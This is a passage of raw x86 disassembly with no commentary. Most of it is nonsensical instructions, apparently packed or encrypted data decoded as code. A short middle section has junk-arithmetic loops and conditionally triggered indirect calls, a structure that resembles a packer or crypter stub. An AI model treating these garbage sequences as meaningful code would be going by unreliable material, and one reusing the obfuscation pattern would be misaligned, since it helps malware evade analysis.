  40ab3b:	cmp    esp,DWORD PTR [eax]
  40ab3d:	sub    eax,0xbaf4a881
  40ab42:	jge    0x40ab3b
  40ab44:	mov    dl,0xb7
  40ab46:	dec    esi
  40ab47:	fwait
  40ab48:	xchg   esi,eax
  40ab49:	out    dx,eax
  40ab4a:	xchg   DWORD PTR ds:0xab33874,eax
  40ab50:	or     al,0x23
  40ab52:	xor    esi,DWORD PTR [ebp-0x5f]
  40ab55:	mov    ebx,0xc79075c3
  40ab5a:	mov    ebx,DWORD PTR [ebx-0x53]
  40ab5d:	xchg   BYTE PTR [eax+0x2a],cl
  40ab60:	mov    al,0x97
  40ab62:	mov    ah,0x57
  40ab64:	mov    ebx,0x1f95d1bc
  40ab69:	ror    BYTE PTR [eax],0x97
  40ab6c:	jns    0x40abad
  40ab6e:	pop    ebx
  40ab6f:	mov    al,ds:0x68ee37c0
  40ab74:	outs   dx,DWORD PTR ds:[esi]
  40ab75:	add    al,BYTE PTR [esi+0x7b]
  40ab78:	hlt    
  40ab79:	and    eax,DWORD PTR [ebx]
  40ab7b:	imul   esi,DWORD PTR [ebx],0xfffffff2
  40ab7e:	fcomp  QWORD PTR [esp+edi*1+0xd]
  40ab82:	(bad)  
  40ab83:	mov    bl,0x75
  40ab85:	arpl   ax,sp
  40ab87:	jge    0x40abb5
  40ab89:	or     DWORD PTR [ecx+ebp*2+0x4f],ebx
  40ab8d:	and    dh,bh
  40ab8f:	mov    esp,0xb15c6327
  40ab94:	lods   al,BYTE PTR ds:[esi]
  40ab95:	sbb    al,BYTE PTR [esi-0x145dea82]
  40ab9b:	(bad)  
  40ab9c:	and    eax,0x1ee47d53
  40aba1:	lock jle 0x40abf7
  40aba4:	pop    esp
  40aba5:	jle    0x40ab8f
  40aba7:	aam    0x6e
  40aba9:	adc    al,0x8d
  40abab:	adc    BYTE PTR [esi+0x3675cbbc],dh
  40abb1:	cs test eax,0x32a009b6
  40abb7:	xchg   esi,ebp
  40abb9:	mov    ebp,0xe913adb5
  40abbe:	or     ebx,esi
  40abc0:	adc    BYTE PTR [eax-0x2306ff57],0xab
  40abc7:	xchg   edx,eax
  40abc8:	inc    ebx
  40abc9:	leave  
  40abca:	(bad)  
  40abcb:	jl     0x40ab7f
  40abcd:	xor    ebx,eax
  40abcf:	lods   eax,DWORD PTR ds:[esi]
  40abd0:	and    ecx,esi
  40abd2:	shl    BYTE PTR [edx-0x4aabe21d],1
  40abd8:	adc    bh,dl
  40abda:	xor    eax,0xf3319110
  40abdf:	scas   al,BYTE PTR es:[edi]
  40abe0:	jne    0x40ac5c
  40abe2:	push   ecx
  40abe3:	lock (bad) 
  40abe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abe6:	mov    edx,0xcda3ac5e
  40abeb:	mov    ebp,ebp
  40abed:	sbb    eax,0xedf0bcf6
  40abf2:	iret   
  40abf3:	jle    0x40ac48
  40abf5:	sbb    bl,BYTE PTR [ecx]
  40abf7:	ja     0x40abc5
  40abf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abfa:	mov    WORD PTR [edx-0x49],ds
  40abfd:	mov    eax,0xd033689f
  40ac02:	xor    DWORD PTR ds:0x42fd75,0x42e78f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e783,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fd5d,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fdfe,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fd75,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e777,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e777,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e777,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e2bd
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e373
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e777
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e777,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e1a8,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e1a8
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e1a8,ebx
  40acad:	cmp    DWORD PTR ds:0x42e1a8,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e1a8,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e377
  40acd5:	cmp    DWORD PTR ds:0x42e1a8,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e1a8
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e1a8,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e1b4
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fd61,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fd61,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fd61,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd81
  40ad3c:	call   DWORD PTR ds:0x42e5cb
  40ad42:	mov    ebx,DWORD PTR ds:0x42fd61
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fd61,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40adc2
  40adb4:	sbb    esp,ecx
  40adb6:	ret    
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40adad
  40adc0:	js     0x40adb4
  40adc2:	cmp    DWORD PTR [eax-0x3a],0xffffffec
  40adc6:	xchg   ebp,eax
  40adc7:	lods   al,BYTE PTR ds:[esi]
  40adc8:	scas   al,BYTE PTR es:[edi]
  40adc9:	mov    al,0x64
  40adcb:	xchg   ebx,eax
  40adcc:	jle    0x40add2
  40adce:	lock dec ecx
  40add0:	pusha  
  40add1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40add2:	lahf   
  40add3:	mov    ebp,DWORD PTR [eax+0x66]
  40add6:	inc    edx
  40add7:	cmc    
  40add8:	sub    esi,eax
  40adda:	add    eax,0xa15ddd1b
  40addf:	xlat   BYTE PTR ds:[ebx]
  40ade0:	ret    
  40ade1:	rol    DWORD PTR [ecx],cl
  40ade3:	in     al,dx
  40ade4:	mov    esi,0x17e0a7a6
  40ade9:	hlt    
  40adea:	xchg   ecx,eax
  40adeb:	sbb    BYTE PTR [eax+0x2aebec3c],ah
  40adf1:	rcr    BYTE PTR [edi-0x63],0x68
  40adf5:	mov    al,ds:0xa0b2503a
  40adfa:	lock ss pop eax
  40adfd:	push   edx
  40adfe:	pop    esi
  40adff:	ins    BYTE PTR es:[edi],dx
  40ae00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae01:	cmc    
  40ae02:	and    bl,BYTE PTR [eax+edx*1-0x265dcdba]
  40ae09:	xchg   ecx,eax
  40ae0a:	pop    ebp
  40ae0b:	add    esp,DWORD PTR [eax]
  40ae0d:	int    0xa2
  40ae0f:	sti    
  40ae10:	pop    es
  40ae11:	push   ebp
  40ae12:	lahf   
  40ae13:	and    al,0x44
  40ae15:	mov    ds:0xd0c579eb,al
  40ae1a:	sub    DWORD PTR [ebx],esp
  40ae1c:	fcomp  QWORD PTR [eax]
  40ae1e:	shr    edx,cl
  40ae20:	mov    ebx,0xbec21eed
  40ae25:	jmp    0x40ae40
  40ae27:	outs   dx,DWORD PTR ds:[esi]
  40ae28:	call   0xd413:0x9d77a5d7
  40ae2f:	add    eax,0x5c9e4a4d
  40ae34:	aas    
  40ae35:	jmp    0x18062d91
  40ae3a:	stos   DWORD PTR es:[edi],eax
  40ae3b:	push   ds
  40ae3c:	fst    QWORD PTR [ebx-0x6b54732f]
  40ae42:	pop    ecx
  40ae43:	push   ss
  40ae44:	lock mov DWORD PTR [ecx+0x47],edx
  40ae48:	cli    
  40ae49:	pop    ebx
  40ae4a:	dec    edi
  40ae4b:	dec    edx
  40ae4c:	jmp    0x40ae5e
  40ae4e:	test   DWORD PTR fs:[ecx-0x6e],edx
  40ae52:	push   cs
  40ae53:	sub    al,BYTE PTR [edi+ebp*4+0x4b]
  40ae57:	retf   
  40ae58:	call   0x95b7b592
  40ae5d:	push   esi
  40ae5e:	mov    eax,ds:0xc0473a06
  40ae63:	sub    bh,bh
  40ae65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae66:	fdivr  DWORD PTR [ecx-0x2a]
  40ae69:	repnz mov ebp,0xa86618fe
  40ae6f:	xor    bh,ch
  40ae71:	mov    ah,0xf0
  40ae73:	sbb    eax,0xee84e54
  40ae78:	stc    
  40ae79:	nop
  40ae7a:	ins    BYTE PTR es:[edi],dx
  40ae7b:	inc    esi
  40ae7d:	(bad)  
  40ae7e:	mov    fs,WORD PTR [ebp-0x12140d5]
  40ae84:	das    
  40ae85:	xor    al,0x33
  40ae87:	pop    eax
  40ae88:	sbb    DWORD PTR [ebp+0x6a],ebp
  40ae8b:	(bad)  
  40ae8c:	imul   al
  40ae8e:	dec    esi
  40ae8f:	in     al,0xdc
  40ae91:	icebp  
  40ae92:	das    
  40ae93:	push   esi
  40ae94:	push   ss
  40ae95:	mov    es,WORD PTR [esi]
  40ae97:	into   
  40ae98:	lods   eax,DWORD PTR ds:[esi]
  40ae99:	add    al,0x44
  40ae9b:	ja     0x40ae40
  40ae9d:	aas    
  40ae9e:	cmp    esi,DWORD PTR [esi+0x2242ef1a]
  40aea4:	or     ecx,DWORD PTR [ecx+0xd63f6f2]
  40aeaa:	jl     0x40ae4a
  40aeac:	and    BYTE PTR [eax],0xd3
  40aeaf:	add    eax,0x7d354fd0
  40aeb4:	sbb    DWORD PTR [ecx+0x3af8836e],esi
  40aeba:	sub    al,0x46
  40aebc:	scas   eax,DWORD PTR es:[edi]
  40aebd:	sti    
  40aebe:	adc    BYTE PTR [eax-0x10],al
  40aec1:	mov    DWORD PTR ds:[edi-0xfdcac38],ecx
  40aec8:	sub    edi,edi
  40aeca:	sar    BYTE PTR [eax+eiz*2+0x4a],1
  40aece:	call   0x43f69371
  40aed3:	jmp    0x9c4c2025
  40aed8:	shr    eax,0xb7
  40aedb:	jg     0x40ae7e
  40aedd:	sub    eax,0xd1543de3
  40aee2:	lods   al,BYTE PTR ds:[esi]
  40aee3:	dec    ebx
  40aee4:	nop
  40aee5:	sbb    BYTE PTR [edx+0x45],cl
  40aee8:	add    ch,BYTE PTR [eax]
  40aeea:	ins    DWORD PTR es:[edi],dx
  40aeeb:	mov    eax,0x26106d3d
  40aef0:	dec    ebp
  40aef1:	sbb    DWORD PTR [edi-0x6c],ecx
  40aef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aef5:	cwde   
  40aef6:	add    DWORD PTR [edx-0x14],ebx
  40aef9:	xor    eax,0x464b5999
  40aefe:	bound  edi,QWORD PTR [edi+ebp*4-0x2]
  40af02:	or     BYTE PTR cs:[eax],ch
  40af05:	add    eax,0x32e6a8fb
  40af0a:	xchg   ebx,eax
  40af0b:	out    0x28,al
  40af0d:	lods   eax,DWORD PTR ds:[esi]
  40af0e:	add    cl,bl
  40af10:	sbb    edi,eax
  40af12:	icebp  
  40af13:	add    esp,ebp
  40af15:	fld    TBYTE PTR [eax-0x18]
  40af18:	and    eax,0x8b4fb2ab
  40af1d:	jmp    0x6ba3:0x3ae61130
  40af24:	inc    ebx
  40af25:	jg     0x40af25
  40af27:	call   ecx
  40af29:	xor    dh,BYTE PTR [esi]
  40af2b:	push   edi
  40af2c:	lock loopne 0x40afae
  40af2f:	ins    DWORD PTR es:[edi],dx
  40af30:	mov    eax,ds:0x88ca2d4f
  40af35:	pushf  
  40af36:	mov    eax,ds:0x6cde314c
  40af3b:	mov    esi,0x52cdb5a4
  40af40:	or     al,0x83
  40af42:	adc    DWORD PTR [esi-0x542e0ce1],eax
  40af48:	or     edi,edi
  40af4a:	icebp  
  40af4b:	inc    esp
  40af4c:	xchg   esi,eax
  40af4d:	dec    ebp
  40af4e:	rcr    DWORD PTR [edx],cl
  40af50:	jb     0x40af1b
  40af52:	mov    DWORD PTR [ebx],edi
  40af54:	cmp    BYTE PTR [ebp-0x26],0x3
  40af58:	sbb    eax,0x653a13e0
  40af5d:	cld    
  40af5e:	xor    cl,BYTE PTR [ecx+0x45]
  40af61:	sub    ch,BYTE PTR [esi-0x6f]
  40af64:	push   esi
  40af65:	test   al,0xa7
  40af67:	and    ebp,DWORD PTR [edi]
  40af69:	(bad)  
  40af6a:	out    dx,al
  40af6b:	in     al,dx
  40af6c:	mov    ?,WORD PTR [esi+0x7a073c69]
  40af72:	xchg   BYTE PTR [eax+0x69],cl
  40af75:	pop    es
  40af76:	mov    ds:0x624471a,eax
  40af7b:	out    dx,al
  40af7c:	inc    esi
  40af7d:	push   eax
  40af7e:	xchg   esi,eax
  40af7f:	xor    al,0xd7
  40af81:	iret   
  40af82:	mov    edx,0xadc6a4fa
  40af87:	and    eax,0x92c7fbee
  40af8c:	jg     0x40af8c
  40af8e:	stc    
  40af8f:	sbb    edx,DWORD PTR [eax]
  40af91:	sub    dl,BYTE PTR [ebp+0x5f]
  40af94:	xchg   DWORD PTR [edx-0x55d537a6],ecx
  40af9a:	int3   
  40af9b:	push   ss
  40af9c:	bound  ecx,QWORD PTR [ebx]
  40af9e:	in     al,0x67
  40afa0:	stc    
  40afa1:	jbe    0x40afff
  40afa3:	test   ah,0xed
  40afa6:	je     0x40b012
  40afa8:	out    dx,eax
  40afa9:	xchg   BYTE PTR [edx],bl
  40afab:	mov    ch,0x11
  40afad:	in     eax,dx
  40afae:	mov    ds:0xeb2e246f,al
  40afb3:	add    esp,DWORD PTR [edx]
  40afb5:	bswap  edi
  40afb7:	and    edi,DWORD PTR [esi-0x40]
  40afba:	xor    al,0x2f
  40afbc:	or     edi,DWORD PTR [ebp+0x29]
  40afbf:	ret    
  40afc0:	rcl    ch,0x9c
  40afc3:	adc    al,0xf
  40afc5:	test   DWORD PTR [ebx+0xdeb1343],ebx
  40afcb:	imul   ebx,DWORD PTR [ecx+0x33],0x2644f7f
  40afd2:	lahf   
  40afd3:	mov    ecx,0x925a38f4
  40afd8:	mov    al,ds:0x9973be0e
  40afdd:	cdq    
  40afde:	dec    ebp
  40afdf:	pop    es
  40afe0:	push   edi
  40afe1:	out    dx,eax
  40afe2:	mov    bl,0xaa
  40afe4:	push   DWORD PTR [edi-0x6bffb379]
  40afea:	je     0x40b01d
  40afec:	cmp    dh,BYTE PTR [edi]
  40afee:	and    BYTE PTR [ebx-0x4b],dh
  40aff1:	mov    al,ds:0x4f4be6aa
  40aff6:	sub    DWORD PTR [esi],esi
  40aff8:	dec    esi
  40aff9:	dec    edx
  40affa:	or     ebp,DWORD PTR [edi]
  40affc:	inc    edx
  40affd:	(bad)  
  40affe:	(bad)  [ecx-0x34ea1660]
  40b004:	dec    edi
  40b005:	popa   
  40b006:	fisubr WORD PTR [edx-0x29]
  40b009:	mov    cl,0x6b
  40b00b:	(bad)  
  40b00c:	xchg   esi,eax
  40b00d:	sti    
  40b00e:	cli    
  40b00f:	sub    ebx,edi
  40b011:	sti    
  40b012:	hlt    
  40b013:	icebp  
  40b014:	fst    DWORD PTR [ebx+eiz*2+0x5c658544]
  40b01b:	popa   
  40b01c:	push   es
  40b01d:	xor    DWORD PTR [edi-0x78ee8ad8],edi
  40b023:	push   esi
  40b024:	sbb    al,0xa5
  40b026:	shl    BYTE PTR [edi-0x2e],1
  40b029:	mov    al,0x75
  40b02b:	add    dl,bl
  40b02d:	jne    0x40b095
  40b02f:	and    eax,0x372eba7f
  40b034:	retf   
  40b035:	and    ebx,DWORD PTR [edx+0x5]
  40b038:	xor    al,0xe7
  40b03a:	mov    bh,0x0
  40b03c:	nop
  40b03d:	sub    al,0x29
  40b03f:	mov    WORD PTR [edi-0xf],ds
  40b042:	mov    al,ds:0x6343995f
  40b047:	mov    ebx,0x1292424
  40b04c:	jg     0x40b060
  40b04e:	pop    ecx
  40b04f:	test   DWORD PTR [ebx+edi*1-0x6bef23ec],ecx
  40b056:	pop    esi
  40b057:	jno    0x40b096
  40b059:	(bad)  
  40b05a:	inc    edi
  40b05b:	pop    edx
  40b05c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b05d:	outs   dx,BYTE PTR ds:[esi]
  40b05e:	inc    esi
  40b05f:	in     eax,dx
  40b060:	out    0x82,eax
  40b062:	dec    esp
  40b063:	xchg   edi,eax
  40b064:	nop
  40b065:	add    BYTE PTR [eax-0x66],0x76
  40b069:	(bad)  
  40b06a:	mov    edi,0x5d74db27
  40b06f:	outs   dx,DWORD PTR ds:[esi]
  40b070:	or     DWORD PTR [ecx],edi
  40b072:	jl     0x40b0a4
  40b074:	cmp    ch,BYTE PTR [edi-0x177af672]
  40b07a:	push   ebp
  40b07b:	scas   eax,DWORD PTR es:[edi]
  40b07c:	(bad)  
  40b07d:	std    
  40b07e:	sub    dh,BYTE PTR [edx+esi*4-0x59]
  40b082:	cld    
  40b083:	bound  esp,QWORD PTR [ebp-0x6a]
  40b086:	icebp  
  40b087:	daa    
  40b088:	adc    esi,DWORD PTR [edi-0x6f]
  40b08b:	cmp    DWORD PTR ds:0xeec9290,0x13
  40b092:	repnz sub ch,BYTE PTR [edi+0x48]
  40b096:	jl     0x40b069
  40b098:	ficomp DWORD PTR [ecx+ebp*2-0x5cb224e6]
  40b09f:	adc    ebp,0xfd343b63
  40b0a5:	ja     0x40b0b6
  40b0a7:	xchg   esp,eax
  40b0a8:	daa    
  40b0a9:	cmc    
  40b0aa:	std    
  40b0ab:	xchg   edx,eax
  40b0ac:	test   al,0xd4
  40b0ae:	add    ebx,DWORD PTR [ebx-0x1e]
  40b0b1:	fist   WORD PTR [ebp-0x46318cf]
  40b0b7:	jb     0x40b07c
  40b0b9:	cmp    ebx,DWORD PTR [edx+0x53724393]
  40b0bf:	cmp    ebx,DWORD PTR [eax+0x222476fb]
  40b0c5:	int3   
  40b0c6:	pusha  
  40b0c7:	jge    0x40b057
  40b0c9:	in     eax,dx
  40b0ca:	xor    BYTE PTR [edx],bl
  40b0cc:	sbb    esi,esi
  40b0ce:	and    al,0xda
  40b0d0:	inc    eax
  40b0d1:	retf   0x3e18
  40b0d4:	sub    esi,DWORD PTR [ecx]
  40b0d6:	mov    edi,0x66817d61
  40b0db:	scas   al,BYTE PTR es:[edi]
  40b0dc:	lds    ecx,FWORD PTR [esi+esi*2]
  40b0df:	and    ch,ah
  40b0e1:	in     eax,0x89
  40b0e3:	lahf   
  40b0e4:	or     al,0xa5
  40b0e6:	sbb    edx,DWORD PTR [eax+eax*4+0x707c6018]
  40b0ed:	adc    al,0xb1
  40b0ef:	sub    al,0x51
  40b0f1:	xchg   esp,eax
  40b0f2:	or     eax,0x5f301033
  40b0f7:	pushf  
  40b0f8:	sub    eax,0x1d71335a
  40b0fd:	call   0x639c:0x25fafb21
  40b104:	sbb    BYTE PTR [edi+esi*4-0x69],dh
  40b108:	pop    ds
  40b109:	jg     0x40b184
  40b10b:	sbb    BYTE PTR [eax+eax*8],dh
  40b10e:	or     DWORD PTR [edx+0x22],esp
  40b111:	in     al,0xae
  40b113:	mov    eax,ds:0x6d235fa2
  40b118:	int    0x93
  40b11a:	outs   dx,BYTE PTR ds:[esi]
  40b11b:	addr16 mov eax,0x1bbe6caf
  40b121:	leave  
  40b122:	sub    eax,0x136c1e0d
  40b127:	arpl   WORD PTR [esi],dx
  40b129:	stos   DWORD PTR es:[edi],eax
  40b12a:	cmp    dl,cl
  40b12c:	pop    eax
  40b12d:	lock test eax,edx
  40b130:	pop    edx
  40b131:	lahf   
  40b132:	pop    ecx
  40b133:	call   0xa68e:0xb7597f82
  40b13a:	imul   ecx,DWORD PTR [ecx-0x26],0xffffffd8
  40b13e:	jae    0x40b15b
  40b140:	cmp    BYTE PTR [esi-0x6a],dl
  40b143:	add    eax,0x580ebdda
  40b148:	pop    edx
  40b149:	xor    BYTE PTR [esi-0x78],cl
  40b14c:	rcr    DWORD PTR [ebp+0x3e20446b],1
  40b152:	out    0xf8,al
  40b154:	inc    eax
  40b155:	adc    eax,0x5511ccf2
  40b15a:	stc    
  40b15b:	and    ebp,esi
  40b15d:	jbe    0x40b119
  40b15f:	xchg   DWORD PTR [ebx],eax
  40b161:	shr    ecx,1
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	or     al,bh
  40b175:	jecxz  0x40b1b9
  40b177:	mov    ds:0x9f7070fa,al
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b138
  40b180:	adc    al,0x25
  40b182:	jp     0x40b1ff
  40b184:	bnd jae 0x40b14d
  40b187:	pop    edx
  40b188:	push   ss
  40b189:	lea    ebp,[eax+0x6a]
  40b18c:	mov    ah,0x2
  40b18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b18f:	loop   0x40b126
  40b191:	ret    0xfd45
  40b194:	cmp    BYTE PTR es:[esi],bh
  40b197:	ss dec esp
  40b199:	repnz mov cl,0x2c
  40b19c:	mov    esi,0x3dad089a
  40b1a1:	mov    dh,0xcb
  40b1a3:	pop    esp
  40b1a4:	cmp    eax,0xae7a2084
  40b1a9:	aad    0x4d
  40b1ab:	xchg   BYTE PTR [edi-0x1d43f77f],bl
  40b1b1:	ja     0x40b226
  40b1b3:	mov    ch,al
  40b1b5:	sub    eax,0xbcfe548d
  40b1ba:	daa    
  40b1bb:	mov    ds:0xcf631821,eax
  40b1c0:	(bad)  
  40b1c1:	mov    al,0x1c
  40b1c3:	and    ch,BYTE PTR [ecx+0x4f]
  40b1c6:	push   eax
  40b1c7:	imul   DWORD PTR [eax-0x11b6ac9a]
  40b1cd:	pop    edx
  40b1ce:	and    edx,DWORD PTR [ecx-0x3abf7c79]
  40b1d4:	add    DWORD PTR [edi*1+0x46983f0a],ebx
  40b1db:	loopne 0x40b16b
  40b1dd:	loopne 0x40b20f
  40b1df:	js     0x40b221
  40b1e1:	cmp    eax,0x500caeb7
  40b1e6:	into   
  40b1e7:	and    edx,DWORD PTR [esi+edi*8]
  40b1ea:	xor    dl,BYTE PTR [ebp+0x19]
  40b1ed:	fwait
  40b1ee:	xchg   BYTE PTR [eax],dl
  40b1f0:	scas   eax,DWORD PTR es:[edi]
  40b1f1:	cmp    ebx,esp
  40b1f3:	clc    
  40b1f4:	push   0x7e406ba3
  40b1f9:	lock adc al,0x8b
  40b1fc:	jae    0x40b1c3
  40b1fe:	mov    ecx,0x350d4a23
  40b203:	pop    DWORD PTR [edi+eax*2+0x6cc6f76]
  40b20a:	and    ch,ah
  40b20c:	jo     0x40b262
  40b20e:	xchg   ebx,eax
  40b20f:	push   eax
  40b210:	add    esp,DWORD PTR [edi-0x64]
  40b213:	or     esp,DWORD PTR [edx]
  40b215:	push   DWORD PTR [esi]
  40b217:	test   BYTE PTR [eax+0x23501e63],cl
  40b21d:	shl    BYTE PTR [ebp+0x8],1
  40b220:	adc    al,0xbc
  40b222:	enter  0x8440,0x85
  40b226:	xor    eax,0x1d53cb2e
  40b22b:	test   dh,ch
  40b22d:	(bad)  
  40b22e:	or     al,0x23
  40b230:	mov    ds:0xaaf3b392,al
  40b235:	push   ebx
  40b236:	or     dh,BYTE PTR [eax+0x78]
  40b239:	pop    es
  40b23a:	ss fistp DWORD PTR fs:[ebx-0xe5e72ba]
  40b242:	cmp    eax,0x22e667f3
  40b247:	xchg   ebx,eax
  40b248:	cdq    
  40b249:	and    al,0x39
  40b24b:	hlt    
  40b24c:	imul   edx,DWORD PTR [ebx],0x4a00417d
  40b252:	lods   al,BYTE PTR ds:[esi]
  40b253:	lock lahf 
  40b255:	pop    ebx
  40b256:	std    
  40b257:	sub    eax,0xa7e28c9a
  40b25c:	leave  
  40b25d:	cld    
  40b25e:	inc    eax
  40b25f:	les    ebp,FWORD PTR [eax-0x39]
  40b262:	outs   dx,BYTE PTR ds:[esi]
  40b263:	inc    ebp
  40b264:	pop    esi
  40b265:	icebp  
  40b266:	mov    dl,0x7c
  40b268:	xor    ah,BYTE PTR [edx+0x62]
  40b26b:	add    DWORD PTR [edx-0x7b651e0c],esp
  40b271:	jo     0x40b20c
  40b273:	es hlt 
  40b275:	scas   eax,DWORD PTR es:[edi]
  40b276:	push   0x65
  40b278:	sub    BYTE PTR [ebp-0x16],0xd0
  40b27c:	scas   eax,DWORD PTR es:[edi]
  40b27d:	popa   
  40b27e:	sbb    al,0x91
  40b280:	(bad)  
  40b281:	pop    eax
  40b282:	cmp    DWORD PTR [edi+ebx*2+0x1f],eax
  40b286:	xor    eax,0xd2739501
  40b28b:	xchg   esi,eax
  40b28c:	popf   
  40b28d:	mov    al,gs:0xfaec8048
  40b293:	pop    esi
  40b294:	mov    WORD PTR [edx],ds
  40b296:	cwde   
  40b297:	mov    edi,0x6e91ecf4
  40b29c:	in     al,dx
  40b29d:	push   esp
  40b29e:	lahf   
  40b29f:	ss gs mov edx,0x72b82833
  40b2a6:	jmp    0xdb05:0x5a4a7992
  40b2ad:	loopne 0x40b275
  40b2af:	ja     0x40b271
  40b2b1:	jmp    0x40b2f5
  40b2b3:	mov    bl,0x3f
  40b2b5:	stos   DWORD PTR es:[edi],eax
  40b2b6:	push   0x7f9d1512
  40b2bb:	push   es
  40b2bc:	mov    edx,0x7ee1253f
  40b2c1:	sub    al,0x1a
  40b2c3:	mov    bl,0x7c
  40b2c5:	sbb    edi,ebp
  40b2c7:	je     0x40b315
  40b2c9:	pop    ds
  40b2ca:	add    dl,BYTE PTR [ebp+0x37]
  40b2cd:	inc    ebp
  40b2ce:	jl     0x40b2be
  40b2d0:	sbb    ebx,edx
  40b2d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2d3:	or     eax,0x76e79a4f
  40b2d8:	fldenv [ebp-0x5a60acd1]
  40b2de:	stos   BYTE PTR es:[edi],al
  40b2df:	xor    ch,BYTE PTR [esi-0x3c]
  40b2e2:	les    esi,FWORD PTR [eax+0x21109d77]
  40b2e8:	inc    eax
  40b2e9:	sar    cl,0xf1
  40b2ec:	mov    bl,0x46
  40b2ee:	pop    ss
  40b2ef:	jnp    0x40b34d
  40b2f1:	dec    ecx
  40b2f2:	loop   0x40b31f
  40b2f4:	push   cs
  40b2f5:	jne    0x40b31d
  40b2f7:	add    al,0xe9
  40b2f9:	int    0xda
  40b2fb:	cmp    BYTE PTR [esi+edx*2-0x4ebaa467],cl
  40b302:	cld    
  40b303:	sbb    al,bl
  40b305:	(bad)  
  40b306:	fs or  al,0x12
  40b309:	rcr    BYTE PTR [ebx+0x685cab9b],1
  40b30f:	and    DWORD PTR [ebp-0x5],esi
  40b312:	lahf   
  40b313:	dec    edi
  40b314:	loope  0x40b350
  40b316:	sar    DWORD PTR [edx-0x2835bcc9],cl
  40b31c:	dec    esi
  40b31d:	in     eax,0xa
  40b31f:	imul   esi,DWORD PTR [eax+0x65f66886],0xffffff97
  40b326:	cmp    edi,DWORD PTR ds:0xb7de9af5
  40b32c:	fwait
  40b32d:	fwait
  40b32e:	sbb    ebx,DWORD PTR [esp+eiz*8+0x29]
  40b332:	daa    
  40b333:	add    cl,BYTE PTR [edx+0x51]
